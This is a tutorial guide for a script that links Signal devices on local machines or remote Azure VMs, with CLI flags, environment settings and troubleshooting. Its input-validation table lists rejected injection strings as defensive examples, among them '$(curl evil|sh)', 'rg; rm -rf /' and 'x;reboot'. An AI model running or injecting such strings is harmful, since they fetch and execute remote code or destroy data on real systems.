# signal-setup — Usage & Tutorial Guide

End-to-end, idempotent Signal device-linking for amplihack, for a **local**
machine or a **remote azlin Azure VM**. One command runs the whole loop:
prerequisite check → prompt → mint a device-link under `systemd-run` → render
the QR **directly in your terminal** (zero delivery latency) → verify linkage →
optionally start the JSON-RPC daemon, ensure the amplihack self-group, and post
a test message.

This guide is the task-oriented companion to the reference docs:

- [`SKILL.md`](./SKILL.md) — the canonical flow, invariants, and critical facts.
- [`SECURITY.md`](./SECURITY.md) — threat model and hardening reference.
- [`README.md`](./README.md) — one-screen quick start.

If you only want to link a host right now, jump to
[Tutorial 1: Link the local host](#tutorial-1-link-the-local-host).

---

## Table of contents

1. [Prerequisites](#prerequisites)
2. [The command](#the-command)
3. [CLI reference](#cli-reference)
4. [Configuration (environment variables)](#configuration-environment-variables)
5. [Tutorials](#tutorials)
6. [Verifying a link](#verifying-a-link)
7. [Troubleshooting](#troubleshooting)
8. [Exit codes & idempotency](#exit-codes--idempotency)
9. [How it works (mental model)](#how-it-works-mental-model)
10. [See also](#see-also)

---

## Prerequisites

Install these on **the machine that renders the QR** — that is the local host
when linking locally, or **your local machine** when linking a remote VM.

| Requirement        | Where             | Install / note                                                             |
| ------------------ | ----------------- | -------------------------------------------------------------------------- |
| `signal-cli` 0.14.5 | target host       | `~/.local/bin/signal-cli` → `~/.local/opt/signal-cli-0.14.5/bin/signal-cli` |
| `qrencode`         | rendering machine | `apt-get install -y qrencode`                                              |
| `systemd-run` / `systemctl` | target host | present on standard systemd hosts                                          |
| `az` CLI           | rendering machine | remote hosts only; needs `az vm run-command` rights on the RG              |
| `nc` (netcat)      | daemon host       | only for the optional daemon post-test                                     |

The known-good `signal-cli` version is **0.14.5**. Other versions may change
the provisioning-socket behavior the 60-second window depends on.

---

## The command

```
amplifier-bundle/skills/signal-setup/scripts/signal-setup.sh --host <name> [options]
```

- `--host local` (or the current hostname) mints **locally**.
- Any other `--host` name is treated as a **remote azlin VM**; the mint runs on
  the VM via `az vm run-command`, and the QR is rendered **locally** from the
  returned `sgnl://` URI.

Show the built-in help at any time:

```bash
scripts/signal-setup.sh --help
```

---

## CLI reference

| Flag                     | Argument   | Default                    | Description                                                                                 |
| ------------------------ | ---------- | -------------------------- | ------------------------------------------------------------------------------------------- |
| `--host`                 | `<name>`   | _(required)_               | Target host. `local`/current hostname → local mint; any other name → remote azlin VM.       |
| `--phone`                | `<+E164>`  | `$SIGNAL_PHONE`            | Signal phone number (E.164, e.g. `+15551234567`). Required for verify/daemon/group steps.   |
| `--group`                | `<name>`   | `amplihack`                | Self-group display name for the post-test.                                                  |
| `--resource-group`       | `<rg>`     | `rysweet-linux-vm-pool`    | Azure resource group for remote hosts. Flows into `az vm run-command -g`.                    |
| `--local`                | —          | auto                       | Force a local mint regardless of `--host`.                                                   |
| `--remote`               | —          | auto                       | Force a remote mint regardless of `--host`.                                                  |
| `--no-daemon`            | —          | daemon on                  | Skip the daemon + self-group + post-test step (link only).                                  |
| `--daemon`               | —          | _(default)_                | Force the daemon + self-group + post-test step.                                             |
| `-y`, `--yes`            | —          | interactive                | Non-interactive: assume the phone's scan screen is already open. Skips the confirm prompt.  |
| `-h`, `--help`           | —          | —                          | Print usage and exit 0.                                                                      |

### Input validation (fail-closed)

Operator-controlled inputs are validated against strict allowlists **before any
use** (they flow into shell command lines, the root-executed remote payload, and
JSON-RPC strings). A non-matching value aborts with a non-zero exit and **no**
side effects.

| Input              | Allowlist                     | Examples accepted                              | Examples rejected                       |
| ------------------ | ----------------------------- | ---------------------------------------------- | --------------------------------------- |
| `--host`           | `^[A-Za-z0-9._-]+$`           | `local`, `deva`, `ia3.internal`                | `x;reboot`, `$(curl evil|sh)`           |
| `--resource-group` | `^[A-Za-z0-9._()-]+$`         | `rysweet-linux-vm-pool`, `my_rg(prod)`         | `rg; rm -rf /`                          |
| `--group`          | `^[A-Za-z0-9._ -]+$`          | `amplihack`, `"amplihack fleet"`               | `a","evil":"`                           |
| `--phone`          | `^\+[1-9][0-9]{7,14}$`        | `+15551234567`                                 | `15551234567` (no `+`), `+1 555; id`    |

See [`SECURITY.md` §3](./SECURITY.md) for the full rationale and invariants.

---

## Configuration (environment variables)

| Variable                             | Default                 | Purpose                                                                                       |
| ------------------------------------ | ----------------------- | --------------------------------------------------------------------------------------------- |
| `SIGNAL_PHONE`                       | _(unset)_               | Default for `--phone`.                                                                         |
| `SIGNAL_SETUP_RG`                    | `rysweet-linux-vm-pool` | Default Azure resource group.                                                                  |
| `SIGNAL_SETUP_VERIFY_TIMEOUT_SECONDS`| `55`                    | Linkage-verify budget. Raise on slow remote hosts (one `az run-command` poll can take ~90s).  |
| `SIGNAL_SETUP_AZ_TIMEOUT_SECONDS`    | `90`                    | `az vm run-command` invocation timeout.                                                        |
| `SIGNAL_SETUP_LOCAL_TIMEOUT_SECONDS` | `10`                    | Local `signal-cli` probe timeout.                                                              |
| `SIGNAL_SETUP_DAEMON_WAIT_ATTEMPTS`  | `20`                    | Half-second daemon/URI poll attempts.                                                          |
| `SIGNAL_SETUP_RPC_TIMEOUT_SECONDS`   | `15`                    | JSON-RPC `nc` timeout.                                                                         |
| `SIGNAL_SETUP_DAEMON_TCP`            | `127.0.0.1:7583`        | Loopback daemon endpoint. **Loopback-only, fail-closed**: only `127.0.0.1`/`localhost` + numeric port accepted. |

> **Security:** `SIGNAL_SETUP_DAEMON_TCP` is validated at startup; routable
> hosts (`0.0.0.0`, LAN IPs) and IPv6/multi-colon forms are rejected before any
> daemon is spawned. Never expose the unauthenticated JSON-RPC daemon off-box.

---

## Tutorials

> **Path convention:** the first two tutorials spell out the full
> `amplifier-bundle/skills/signal-setup/scripts/signal-setup.sh` path from the
> repo root. Later tutorials use the shorter `scripts/signal-setup.sh` form,
> which assumes your shell is in the skill directory
> (`amplifier-bundle/skills/signal-setup/`). Both invoke the same script — use
> whichever matches your working directory.

### Tutorial 1: Link the local host

Interactive, with the daemon post-test:

```bash
# 1. Open Signal on your phone: Settings ▸ Linked Devices ▸ Link New Device
#    Leave the camera/scan screen open BEFORE you run the command.

# 2. Run the setup (it will prompt you to confirm the scan screen is ready):
amplifier-bundle/skills/signal-setup/scripts/signal-setup.sh \
  --host local --phone +15551234567
```

The QR prints directly in your terminal. **Scan it immediately** — it is valid
for only ~60 seconds. On success the script verifies the link, starts the
JSON-RPC daemon on `127.0.0.1:7583`, ensures the `amplihack` self-group, and
posts a test message.

### Tutorial 2: Link a remote azlin VM

The mint runs on the VM via `az vm run-command`; the QR renders **locally**, so
only the short `sgnl://` URI crosses the network:

```bash
amplifier-bundle/skills/signal-setup/scripts/signal-setup.sh \
  --host deva --phone +15551234567 \
  --resource-group rysweet-linux-vm-pool
```

Requirements: `az` logged in with `az vm run-command` rights on the RG, and
`qrencode` installed **locally**.

> **azlin gotchas:** only ONE bastion/azlin session per VM at a time, and never
> pipe `azlin`/`az` output into an early-closing consumer (SIGPIPE core-dumps
> `azlin`). The script already captures full output before filtering.

### Tutorial 3: Non-interactive (scan screen already open)

Skip the confirmation prompt when you have already opened the scan screen:

```bash
scripts/signal-setup.sh --host dev -y --phone +15551234567
```

### Tutorial 4: Link only, skip the daemon/group/post-test

```bash
scripts/signal-setup.sh --host dev --no-daemon
```

Useful when the amplihack channel wiring is handled elsewhere, or you only need
device linkage.

### Tutorial 5: Re-verify an already-linked host (idempotent)

Re-running against a host that is already linked (detected via
`signal-cli listAccounts`) does **not** re-mint. It skips straight to the
daemon/self-group/post-test verification and exits successfully:

```bash
scripts/signal-setup.sh --host local --phone +15551234567
# → "already linked" → (re)ensures daemon + self-group → exit 0
```

### Tutorial 6: Custom self-group name

```bash
scripts/signal-setup.sh --host local --phone +15551234567 \
  --group "amplihack fleet"
```

---

## Verifying a link

A link is confirmed when **any** of these hold:

- `signal-cli listAccounts` shows `Number: +<phone>`.
- The transient `sig-link-<host>` systemd unit becomes `inactive`.
- The trace log (path printed on a verification failure) shows
  `Associated with: +<phone>` followed by `Finishing new device registration`.

Daemon post-test success:

- Daemon: `signal-cli -a +<phone> daemon --tcp 127.0.0.1:7583`.
- Self-group: JSON-RPC `updateGroup{account,name}` returns a `groupId`.
- Post-test: JSON-RPC `send{account,groupId,message}` returns
  `{"results":[],"timestamp":...}`. An **empty `results` array is expected
  success** for a self-only group.

---

## Troubleshooting

### "invalid response from server" on the phone

Almost always the **expired-QR / 60-second-window** failure. Signal's
provisioning websocket closes with server code **1001 at ~+60s** after the QR is
minted. Any delivery path slower than a few seconds expires the QR.

**Fix:**

1. Open the phone's scan screen **first**, then run the command.
2. Scan the terminal QR **immediately** when it prints.
3. Never route the QR through Signal itself (the deprecated slow path).
4. For remote hosts, keep using in-terminal local rendering (the default) — do
   not relay the QR through a remote daemon.

### QR is invisible / unscannable on a dark terminal

The script renders with `qrencode -t ANSIUTF8i` — the trailing **`i` (inverted)**
is required for dark backgrounds. Plain `ANSIUTF8` is dark-on-dark and
effectively invisible. If you customize rendering, keep the `i`.

### Spurious re-mint on a slow remote host

A single `az vm run-command` poll can take ~90s. If verification times out and
the script tries to re-mint an already-linked host, raise the budget:

```bash
SIGNAL_SETUP_VERIFY_TIMEOUT_SECONDS=120 \
  scripts/signal-setup.sh --host deva --phone +15551234567
```

### "Multiple Signal accounts found"

Re-run with an explicit `--phone` to select the account:

```bash
scripts/signal-setup.sh --host local --phone +15551234567
```

### Remote link fails / `az` errors

- Confirm `az login` and that your identity has `az vm run-command` rights on the
  `--resource-group`.
- Ensure only **one** bastion/azlin session targets the VM.
- On failure, the `-vv` trace log is retained (`0600`) and its path printed for
  diagnosis; it never contains the `sgnl://` link secret.

---

## Exit codes & idempotency

- **0** — success, including the idempotent "already linked" fast path.
- **non-zero** — invalid input (fail-closed validation), missing prerequisites,
  or a link/verify failure. Secrets are cleaned up on every exit path
  (`trap ... EXIT INT TERM`); the `sgnl://` URI is always purged.

The script is safe to re-run: an already-linked host is detected and re-mint is
skipped. Only the daemon/self-group/post-test is (re)ensured.

---

## How it works (mental model)

1. **Prereq check** — `signal-cli` (0.14.5), `qrencode`, `systemd-run` on target;
   plus `az` + local `qrencode` for remote hosts.
2. **Idempotency probe** — `listAccounts` showing `Number: +<phone>` → skip mint.
3. **Prompt** — you confirm the phone scan screen is open (skipped with `-y`).
4. **Mint** — `signal-cli link -n amplihack-<host>` under a transient
   `systemd-run` unit (`sig-link-<host>`), so it survives the launching shell.
5. **Render QR** — `qrencode -t ANSIUTF8i`, piped via **stdin** (secret never on
   argv). Scan within ~60s.
6. **Verify** — poll `listAccounts`; the transient unit goes `inactive` on
   success.
7. **Daemon + self-group + post-test** (default) — daemon on `127.0.0.1:7583`,
   self-only group, and a self-send post-test.

The three load-bearing facts: the **60-second window**, **`ANSIUTF8i` inverted**
rendering, and **`systemd-run` persistence** (with `--uid=azureuser` remotely,
since `az vm run-command` runs as root). See [`SKILL.md`](./SKILL.md) for the
full treatment.

---

## See also

- [`SKILL.md`](./SKILL.md) — canonical flow, invariants, and critical facts.
- [`SECURITY.md`](./SECURITY.md) — threat model, input allowlists, secret
  temp-file regime, JSON-RPC escaping, trust anchors.
- [`README.md`](./README.md) — one-screen quick start.
- `docs/SIGNAL_ONBOARDING.md`, `docs/signal-channel.md` — repo-level Signal
  onboarding and channel docs.
- `crates/amplihack-signal/`, `crates/amplihack-cli/src/commands/signal/` — the
  Rust integration this skill's linking loop feeds into.
